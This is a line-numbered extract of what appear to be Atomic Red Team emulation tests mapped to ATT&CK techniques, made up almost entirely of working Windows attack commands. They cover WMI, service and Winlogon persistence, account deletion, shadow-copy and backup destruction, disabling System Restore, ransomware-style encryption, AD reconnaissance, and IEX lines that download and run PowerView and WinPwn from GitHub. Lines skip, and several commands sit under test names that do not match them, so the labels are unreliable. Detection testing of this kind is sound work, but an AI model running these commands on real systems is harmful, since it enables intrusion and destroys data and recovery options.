5011: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [                      Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};]
5012: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [      $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs]
5013: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] []
5014: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [      $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';]
5015: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [                      CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";}]
5016: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [      $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs]
5017: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] []
5018: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [      $FilterToConsumerArgs = @{]
5019: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [      Filter = [Ref] $Filter;]
5020: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [      Consumer = [Ref] $Consumer;]
5021: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [      }]
5022: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [      $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs]
5032: [- name: Service Installation CMD] [attack_technique: T1543.003] [    command: |]
5033: [- name: Service Installation CMD] [attack_technique: T1543.003] [      sc config Fax binPath= "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \"write-host 'T1543.003 Test'\""]
5034: [- name: Service Installation CMD] [attack_technique: T1543.003] [      sc start Fax]
5035: [- name: Service Installation CMD] [attack_technique: T1543.003] [    cleanup_command:]
5036: [- name: Service Installation CMD] [attack_technique: T1543.003] [      sc config Fax binPath= "C:\WINDOWS\system32\fxssvc.exe" >nul 2>&1]
5037: [- name: Service Installation CMD] [attack_technique: T1543.003] []
5038: [- name: Service Installation CMD] [attack_technique: T1543.003] [  auto_generated_guid: 981e2942-e433-44e9-afc1-8c957a1496b6]
5039: [- name: Service Installation CMD] [attack_technique: T1543.003] [    Download an executable from github and start it as a service.]
5040: [- name: Service Installation CMD] [attack_technique: T1543.003] [    Upon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.]
5041: [- name: Service Installation CMD] [attack_technique: T1543.003] [  supported_platforms:]
5042: [- name: Service Installation CMD] [attack_technique: T1543.003] [    - windows]
5043: [- name: Service Installation CMD] [attack_technique: T1543.003] [  input_arguments:]
5044: [- name: Service Installation CMD] [attack_technique: T1543.003] [    binary_path:]
5045: [- name: Service Installation CMD] [attack_technique: T1543.003] [      type: Path]
5046: [- name: Service Installation CMD] [attack_technique: T1543.003] [      default: PathToAtomicsFolder\T1543.003\bin\AtomicService.exe]
5047: [- name: Service Installation CMD] [attack_technique: T1543.003] [    service_name:]
5048: [- name: Service Installation CMD] [attack_technique: T1543.003] [      type: String]
5049: [- name: Service Installation CMD] [attack_technique: T1543.003] [      default: AtomicTestService_CMD]
5050: [- name: Service Installation CMD] [attack_technique: T1543.003] []
5051: [- name: Service Installation CMD] [attack_technique: T1543.003] [  dependency_executor_name: powershell]
5052: [- name: Service Installation CMD] [attack_technique: T1543.003] [  dependencies:]
5053: [- name: Service Installation CMD] [attack_technique: T1543.003] [    - description: |]
5054: [- name: Service Installation CMD] [attack_technique: T1543.003] [        Service binary must exist on disk at specified location (#{binary_path})]
5055: [- name: Service Installation CMD] [attack_technique: T1543.003] [      prereq_command: |]
5056: [- name: Service Installation CMD] [attack_technique: T1543.003] [        if (Test-Path #{binary_path}) {exit 0} else {exit 1}]
5057: [- name: Service Installation CMD] [attack_technique: T1543.003] [      get_prereq_command: |]
5058: [- name: Service Installation CMD] [attack_technique: T1543.003] [        New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null]
5059: [- name: Service Installation CMD] [attack_technique: T1543.003] [        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"]
5060: [- name: Service Installation CMD] [attack_technique: T1543.003] [  executor:]
5063: [- name: Service Installation PowerShell] [attack_technique: T1543.003] [    command: |]
5064: [- name: Service Installation PowerShell] [attack_technique: T1543.003] [      sc.exe create #{service_name} binPath= #{binary_path}]
5065: [- name: Service Installation PowerShell] [attack_technique: T1543.003] [      sc.exe start #{service_name}]
5091: [- name: TinyTurla backdoor service w64time] [attack_technique: T1543.003] [    command: |]
5092: [- name: TinyTurla backdoor service w64time] [attack_technique: T1543.003] [      New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"]
5093: [- name: TinyTurla backdoor service w64time] [attack_technique: T1543.003] [      Start-Service -Name "#{service_name}"]
5121: [- name: Winlogon Shell Key Persistence - PowerShell] [attack_technique: T1547.004] [    command: |]
5122: [- name: Winlogon Shell Key Persistence - PowerShell] [attack_technique: T1547.004] [      Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, #{binary_to_execute}" -Force]
5127: [- name: Winlogon Userinit Key Persistence - PowerShell] [attack_technique: T1547.004] [    command: |]
5128: [- name: Winlogon Userinit Key Persistence - PowerShell] [attack_technique: T1547.004] [      Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, #{binary_to_execute}" -Force]
5133: [- name: Winlogon Notify Key Logon Persistence - PowerShell] [attack_technique: T1547.004] [    command: |]
5134: [- name: Winlogon Notify Key Logon Persistence - PowerShell] [attack_technique: T1547.004] [      New-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" -Force]
5135: [- name: Winlogon Notify Key Logon Persistence - PowerShell] [attack_technique: T1547.004] [      Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" "logon" "#{binary_to_execute}" -Force]
5140: [- name: Change User Password - Windows] [attack_technique: T1531] [    command: |]
5141: [- name: Change User Password - Windows] [attack_technique: T1531] [      net user #{user_account} #{new_user_password} /add]
5142: [- name: Change User Password - Windows] [attack_technique: T1531] [      net.exe user #{user_account} #{new_password}]
5147: [- name: Delete User - Windows] [attack_technique: T1531] [    command: |]
5148: [- name: Delete User - Windows] [attack_technique: T1531] [      net user #{user_account} #{new_user_password} /add]
5149: [- name: Delete User - Windows] [attack_technique: T1531] [      net.exe user #{user_account} /delete]
5152: [- name: Remove Account From Domain Admin Group] [attack_technique: T1531] [    command: |]
5153: [- name: Remove Account From Domain Admin Group] [attack_technique: T1531] [      $PWord = ConvertTo-SecureString -String #{super_pass} -AsPlainText -Force]
5154: [- name: Remove Account From Domain Admin Group] [attack_technique: T1531] [      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{super_user}, $PWord]
5155: [- name: Remove Account From Domain Admin Group] [attack_technique: T1531] [      if((Get-ADUser #{remove_user} -Properties memberof).memberof -like "CN=Domain Admins*"){]
5156: [- name: Remove Account From Domain Admin Group] [attack_technique: T1531] [        Remove-ADGroupMember -Identity "Domain Admins" -Members #{remove_user} -Credential $Credential -Confirm:$False]
5157: [- name: Remove Account From Domain Admin Group] [attack_technique: T1531] [      } else{]
5158: [- name: Remove Account From Domain Admin Group] [attack_technique: T1531] [          write-host "Error - Make sure #{remove_user} is in the domain admins group" -foregroundcolor Red]
5159: [- name: Remove Account From Domain Admin Group] [attack_technique: T1531] [      }]
5162: [- name: Windows - Overwrite file with Sysinternals SDelete] [attack_technique: T1485] [    command: |]
5163: [- name: Windows - Overwrite file with Sysinternals SDelete] [attack_technique: T1485] [      if (-not (Test-Path #{file_to_delete})) { New-Item #{file_to_delete} -Force }]
5164: [- name: Windows - Overwrite file with Sysinternals SDelete] [attack_technique: T1485] [      Invoke-Expression -Command "#{sdelete_exe} -accepteula #{file_to_delete}"]
5167: [- name: Overwrite deleted data on C drive] [attack_technique: T1485] [    command: |]
5168: [- name: Overwrite deleted data on C drive] [attack_technique: T1485] [      cipher.exe /w:C:]
5171: [- name: PureLocker Ransom Note] [attack_technique: T1486] [    command: |]
5172: [- name: PureLocker Ransom Note] [attack_technique: T1486] [      $which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}]
5173: [- name: PureLocker Ransom Note] [attack_technique: T1486] [      $which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}]
5174: [- name: PureLocker Ransom Note] [attack_technique: T1486] [      $which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}]
5185: [- name: Windows - Delete Volume Shadow Copies] [attack_technique: T1490] [    command: |]
5186: [- name: Windows - Delete Volume Shadow Copies] [attack_technique: T1490] [      vssadmin.exe delete shadows /all /quiet]
5189: [- name: Windows - Delete Volume Shadow Copies via WMI] [attack_technique: T1490] [    command: |]
5190: [- name: Windows - Delete Volume Shadow Copies via WMI] [attack_technique: T1490] [      wmic.exe shadowcopy delete]
5193: [- name: Windows - wbadmin Delete Windows Backup Catalog] [attack_technique: T1490] [    command: |]
5194: [- name: Windows - wbadmin Delete Windows Backup Catalog] [attack_technique: T1490] [      wbadmin delete catalog -quiet]
5197: [- name: Windows - Disable Windows Recovery Console Repair] [attack_technique: T1490] [    command: |]
5198: [- name: Windows - Disable Windows Recovery Console Repair] [attack_technique: T1490] [      bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures]
5199: [- name: Windows - Disable Windows Recovery Console Repair] [attack_technique: T1490] [      bcdedit.exe /set {default} recoveryenabled no]
5205: [- name: Windows - Delete Volume Shadow Copies via WMI with PowerShell] [attack_technique: T1490] [    command: |]
5206: [- name: Windows - Delete Volume Shadow Copies via WMI with PowerShell] [attack_technique: T1490] [      Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}]
5209: [- name: Windows - Delete Backup Files] [attack_technique: T1490] [    command: |]
5210: [- name: Windows - Delete Backup Files] [attack_technique: T1490] [      del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk]
5213: [- name: Windows - wbadmin Delete systemstatebackup] [attack_technique: T1490] [    command: |]
5214: [- name: Windows - wbadmin Delete systemstatebackup] [attack_technique: T1490] [      wbadmin delete systemstatebackup -keepVersions:0]
5217: [- name: Windows - Disable the SR scheduled task] [attack_technique: T1490] [    command: |]
5218: [- name: Windows - Disable the SR scheduled task] [attack_technique: T1490] [      schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /disable]
5223: [- name: Disable System Restore Through Registry] [attack_technique: T1490] [    command: |]
5224: [- name: Disable System Restore Through Registry] [attack_technique: T1490] [      reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f]
5225: [- name: Disable System Restore Through Registry] [attack_technique: T1490] [      reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f]
5226: [- name: Disable System Restore Through Registry] [attack_technique: T1490] [      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f]
5227: [- name: Disable System Restore Through Registry] [attack_technique: T1490] [      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f]
5235: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [    command: |]
5236: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [        $url = "#{url_of_wallpaper}"]
5237: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [        $imgLocation = "#{wallpaper_location}"]
5238: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [        $orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\Control Panel\Desktop\' -Name WallPaper).WallPaper]
5239: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [        $orgWallpaper | Out-File -FilePath "#{pointer_to_orginal_wallpaper}"]
5240: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [        $updateWallpapercode = @' ]
5241: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [        using System.Runtime.InteropServices; ]
5242: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [        namespace Win32{]
5243: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [        ]
5244: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [            public class Wallpaper{ ]
5245: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [                [DllImport("user32.dll", CharSet=CharSet.Auto)] ]
5246: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [                 static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; ]
5247: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [                 ]
5248: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [                 public static void SetWallpaper(string thePath){ ]
5249: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [                    SystemParametersInfo(20,0,thePath,3); ]
5250: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [                }]
5251: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [            }]
5252: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [        } ]
5253: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [        '@]
5254: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [        $wc = New-Object System.Net.WebClient  ]
5255: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [        try{  ]
5256: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [            $wc.DownloadFile($url, $imgLocation)]
5257: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [            add-type $updateWallpapercode ]
5258: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [            [Win32.Wallpaper]::SetWallpaper($imgLocation)]
5259: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [        } ]
5260: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [        catch [System.Net.WebException]{  ]
5261: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [            Write-Host("Cannot download $url") ]
5262: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [            add-type $updateWallpapercode ]
5263: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [            [Win32.Wallpaper]::SetWallpaper($imgLocation)]
5264: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [        } ]
5265: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [        finally{    ]
5266: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [            $wc.Dispose()  ]
5267: [- name: Replace Desktop Wallpaper] [attack_technique: T1491.001] [        }]
5292: [- name: Windows - Stop service using Service Controller] [attack_technique: T1489] [    command: |]
5293: [- name: Windows - Stop service using Service Controller] [attack_technique: T1489] [      sc.exe stop #{service_name}]
5298: [- name: Windows - Stop service using net.exe] [attack_technique: T1489] [    command: |]
5299: [- name: Windows - Stop service using net.exe] [attack_technique: T1489] [      net.exe stop #{service_name}]
5304: [- name: Windows - Stop service by killing process] [attack_technique: T1489] [    command: |]
5305: [- name: Windows - Stop service by killing process] [attack_technique: T1489] [      taskkill.exe /f /im #{process_name}]
5308: [- name: Shutdown System - Windows] [attack_technique: T1529] [    command: |]
5309: [- name: Shutdown System - Windows] [attack_technique: T1529] [      shutdown /s /t #{timeout}]
5312: [- name: Restart System - Windows] [attack_technique: T1529] [    command: |]
5313: [- name: Restart System - Windows] [attack_technique: T1529] [      shutdown /r /t #{timeout}]
5316: [- name: List Process Main Windows - C# .NET] [attack_technique: T1010] [    command: |]
5317: [- name: List Process Main Windows - C# .NET] [attack_technique: T1010] [      C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:#{output_file_name} #{input_source_code}]
5318: [- name: List Process Main Windows - C# .NET] [attack_technique: T1010] [      #{output_file_name}]
5323: [- name: List Google Chrome / Opera Bookmarks on Windows with powershell] [attack_technique: T1217] [    command: |]
5324: [- name: List Google Chrome / Opera Bookmarks on Windows with powershell] [attack_technique: T1217] [      Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force]
5327: [- name: List Google Chrome / Edge Chromium Bookmarks on Windows with command prompt] [attack_technique: T1217] [    command: |]
5328: [- name: List Google Chrome / Edge Chromium Bookmarks on Windows with command prompt] [attack_technique: T1217] [      where /R C:\Users\ Bookmarks]
5331: [- name: List Mozilla Firefox bookmarks on Windows with command prompt] [attack_technique: T1217] [    command: |]
5332: [- name: List Mozilla Firefox bookmarks on Windows with command prompt] [attack_technique: T1217] [      where /R C:\Users\ places.sqlite]
5335: [- name: List Internet Explorer Bookmarks using the command prompt] [attack_technique: T1217] [    command: |]
5336: [- name: List Internet Explorer Bookmarks using the command prompt] [attack_technique: T1217] [      dir /s /b %USERPROFILE%\Favorites]
5339: [- name: Enumerate all accounts (Domain)] [attack_technique: T1087.002] [    command: |]
5340: [- name: Enumerate all accounts (Domain)] [attack_technique: T1087.002] [      net user /domain]
5341: [- name: Enumerate all accounts (Domain)] [attack_technique: T1087.002] [      net group /domain]
5344: [- name: Enumerate all accounts via PowerShell (Domain)] [attack_technique: T1087.002] [    command: |]
5345: [- name: Enumerate all accounts via PowerShell (Domain)] [attack_technique: T1087.002] [      net user /domain]
5346: [- name: Enumerate all accounts via PowerShell (Domain)] [attack_technique: T1087.002] [      get-localgroupmember -group Users]
5347: [- name: Enumerate all accounts via PowerShell (Domain)] [attack_technique: T1087.002] [      get-aduser -filter *]
5350: [- name: Enumerate logged on users via CMD (Domain)] [attack_technique: T1087.002] [    command: |]
5351: [- name: Enumerate logged on users via CMD (Domain)] [attack_technique: T1087.002] [      query user /SERVER:#{computer_name}]
5354: [- name: Automated AD Recon (ADRecon)] [attack_technique: T1087.002] [    command: |]
5355: [- name: Automated AD Recon (ADRecon)] [attack_technique: T1087.002] [      Invoke-Expression #{adrecon_path}]
5361: [- name: Adfind -Listing password policy] [attack_technique: T1087.002] [    command: |]
5362: [- name: Adfind -Listing password policy] [attack_technique: T1087.002] [      #{adfind_path} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties]
5365: [- name: Adfind - Enumerate Active Directory Admins] [attack_technique: T1087.002] [    command: |]
5366: [- name: Adfind - Enumerate Active Directory Admins] [attack_technique: T1087.002] [      #{adfind_path} -sc admincountdmp]
5369: [- name: Adfind - Enumerate Active Directory User Objects] [attack_technique: T1087.002] [    command: |]
5370: [- name: Adfind - Enumerate Active Directory User Objects] [attack_technique: T1087.002] [      #{adfind_path} -f (objectcategory=person)]
5373: [- name: Adfind - Enumerate Active Directory Exchange AD Objects] [attack_technique: T1087.002] [    command: |]
5374: [- name: Adfind - Enumerate Active Directory Exchange AD Objects] [attack_technique: T1087.002] [      #{adfind_path} -sc exchaddresses]
5377: [- name: Enumerate Default Domain Admin Details (Domain)] [attack_technique: T1087.002] [    command: |]
5378: [- name: Enumerate Default Domain Admin Details (Domain)] [attack_technique: T1087.002] [      net user administrator /domain]
5381: [- name: Get-DomainUser with PowerView] [attack_technique: T1087.002] [    command: |]
5382: [- name: Get-DomainUser with PowerView] [attack_technique: T1087.002] [      Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain}]
5383: [- name: Get-DomainUser with PowerView] [attack_technique: T1087.002] []
5384: [- name: Get-DomainUser with PowerView] [attack_technique: T1087.002] [  auto_generated_guid: 93662494-5ed7-4454-a04c-8c8372808ac2]
5385: [- name: Get-DomainUser with PowerView] [attack_technique: T1087.002] [    Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.]
5386: [- name: Get-DomainUser with PowerView] [attack_technique: T1087.002] [  supported_platforms:]
5387: [- name: Get-DomainUser with PowerView] [attack_technique: T1087.002] [  - windows]
5388: [- name: Get-DomainUser with PowerView] [attack_technique: T1087.002] [  executor:]
5389: [- name: Get-DomainUser with PowerView] [attack_technique: T1087.002] [    command: |]
5390: [- name: Get-DomainUser with PowerView] [attack_technique: T1087.002] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
5391: [- name: Get-DomainUser with PowerView] [attack_technique: T1087.002] [      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose]
5394: [- name: Enumerate Linked Policies In ADSISearcher Discovery] [attack_technique: T1087.002] [    command: |]
5395: [- name: Enumerate Linked Policies In ADSISearcher Discovery] [attack_technique: T1087.002] [      ([adsisearcher]"objectcategory=user").FindAll(); ([adsisearcher]"objectcategory=user").FindOne()]
5396: [- name: Enumerate Linked Policies In ADSISearcher Discovery] [attack_technique: T1087.002] [  auto_generated_guid: 7ab0205a-34e4-4a44-9b04-e1541d1a57be]
5397: [- name: Enumerate Linked Policies In ADSISearcher Discovery] [attack_technique: T1087.002] [    The following Atomic test will utilize ADSISearcher to enumerate organizational unit within Active Directory.]
5398: [- name: Enumerate Linked Policies In ADSISearcher Discovery] [attack_technique: T1087.002] [    Upon successful execution a listing of users will output with their paths in AD.]
5399: [- name: Enumerate Linked Policies In ADSISearcher Discovery] [attack_technique: T1087.002] [    Reference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81]
5400: [- name: Enumerate Linked Policies In ADSISearcher Discovery] [attack_technique: T1087.002] [  supported_platforms:]
5401: [- name: Enumerate Linked Policies In ADSISearcher Discovery] [attack_technique: T1087.002] [  - windows]
5402: [- name: Enumerate Linked Policies In ADSISearcher Discovery] [attack_technique: T1087.002] [  executor:]
5405: [- name: Enumerate Root Domain linked policies Discovery] [attack_technique: T1087.002] [    command: |]
5406: [- name: Enumerate Root Domain linked policies Discovery] [attack_technique: T1087.002] [      (([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]"$_").gPlink){Write-Host "[+] OU Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) -replace "[[;]" -split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host "Policy Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host "Policy Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output "`n" }}]
5407: [- name: Enumerate Root Domain linked policies Discovery] [attack_technique: T1087.002] [  auto_generated_guid: 00c652e2-0750-4ca6-82ff-0204684a6fe4]
5408: [- name: Enumerate Root Domain linked policies Discovery] [attack_technique: T1087.002] [  - windows]
5409: [- name: Enumerate Root Domain linked policies Discovery] [attack_technique: T1087.002] [  executor:]
5412: [- name: WinPwn - generaldomaininfo] [attack_technique: T1087.002] [    command: |]
5413: [- name: WinPwn - generaldomaininfo] [attack_technique: T1087.002] [      (([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]"$_").gPlink){Write-Host "[+] Domain Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) -replace "[[;]" -split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host "Policy Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host "Policy Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output "`n" }}]
5414: [- name: WinPwn - generaldomaininfo] [attack_technique: T1087.002] [  auto_generated_guid: ce483c35-c74b-45a7-a670-631d1e69db3d]
5415: [- name: WinPwn - generaldomaininfo] [attack_technique: T1087.002] [  - windows]
5416: [- name: WinPwn - generaldomaininfo] [attack_technique: T1087.002] [  executor:]
5417: [- name: WinPwn - generaldomaininfo] [attack_technique: T1087.002] [    command: |-]
5418: [- name: WinPwn - generaldomaininfo] [attack_technique: T1087.002] [      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t']
5419: [- name: WinPwn - generaldomaininfo] [attack_technique: T1087.002] [      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')]
5420: [- name: WinPwn - generaldomaininfo] [attack_technique: T1087.002] [      generaldomaininfo -noninteractive -consoleoutput]
5423: [- name: Basic Permission Groups Discovery Windows (Domain)] [attack_technique: T1069.002] [    command: |]
5424: [- name: Basic Permission Groups Discovery Windows (Domain)] [attack_technique: T1069.002] [      net localgroup]
5425: [- name: Basic Permission Groups Discovery Windows (Domain)] [attack_technique: T1069.002] [      net group /domain]
5426: [- name: Basic Permission Groups Discovery Windows (Domain)] [attack_technique: T1069.002] [      net group "domain admins" /domain]
5427: [- name: Basic Permission Groups Discovery Windows (Domain)] [attack_technique: T1069.002] [      net group "enterprise admins" /domain]
5430: [- name: Permission Groups Discovery PowerShell (Domain)] [attack_technique: T1069.002] [    command: |]
5431: [- name: Permission Groups Discovery PowerShell (Domain)] [attack_technique: T1069.002] [      get-ADPrincipalGroupMembership #{user} | select name]
5434: [- name: Elevated group enumeration using net group (Domain)] [attack_technique: T1069.002] [    command: |]
5435: [- name: Elevated group enumeration using net group (Domain)] [attack_technique: T1069.002] [      net group /domai "Domain Admins"]
5436: [- name: Elevated group enumeration using net group (Domain)] [attack_technique: T1069.002] [      net groups "Account Operators" /doma]
5437: [- name: Elevated group enumeration using net group (Domain)] [attack_technique: T1069.002] [      net groups "Exchange Organization Management" /doma]
5438: [- name: Elevated group enumeration using net group (Domain)] [attack_technique: T1069.002] [      net group "BUILTIN\Backup Operators" /doma]
5441: [- name: Find machines where user has local admin access (PowerView)] [attack_technique: T1069.002] [    command: |]
5442: [- name: Find machines where user has local admin access (PowerView)] [attack_technique: T1069.002] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
5443: [- name: Find machines where user has local admin access (PowerView)] [attack_technique: T1069.002] [      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose]
5446: [- name: Find local admins on all machines in domain (PowerView)] [attack_technique: T1069.002] [    command: |]
5447: [- name: Find local admins on all machines in domain (PowerView)] [attack_technique: T1069.002] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
5448: [- name: Find local admins on all machines in domain (PowerView)] [attack_technique: T1069.002] [      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose]
5456: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [    command: |]
5457: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [      get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}]
5458: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [  auto_generated_guid: 48ddc687-82af-40b7-8472-ff1e742e8274]
5459: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [    Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups]
5460: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [    reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html]
5461: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [  supported_platforms:]
5462: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [  - windows]
5463: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [  input_arguments:]
5464: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [    adfind_path:]
5465: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [      type: Path]
5466: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [      default: PathToAtomicsFolder\T1087.002\src\AdFind.exe]
5467: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [  dependency_executor_name: powershell]
5468: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [  dependencies:]
5469: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [  - description: |]
5470: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [      AdFind.exe must exist on disk at specified location (#{adfind_path})]
5471: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [    prereq_command: |]
5472: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [      if (Test-Path #{adfind_path}) {exit 0} else {exit 1}]
5473: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [    get_prereq_command: |]
5474: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
